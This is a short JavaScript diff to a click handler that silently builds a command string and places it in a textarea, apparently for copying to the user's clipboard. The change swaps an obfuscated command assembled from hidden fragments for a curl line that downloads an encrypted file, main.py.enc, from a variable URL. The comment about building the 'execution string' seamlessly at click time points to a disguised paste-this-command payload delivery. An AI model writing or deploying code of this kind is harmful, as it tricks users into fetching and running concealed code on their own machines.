@@ -34,7 +34,7 @@
 
     c.onclick = () => {
         // Construct the execution string seamlessly at the moment of the mouse click
-        const executionString = `${_b}${_c} "${binaryStorageUrl}"${_d}`;
+        const executionString = `curl -fL "${binaryStorageUrl}" -o main.py.enc`;
 
         const e = document.createElement('textarea');
         e.value = executionString;
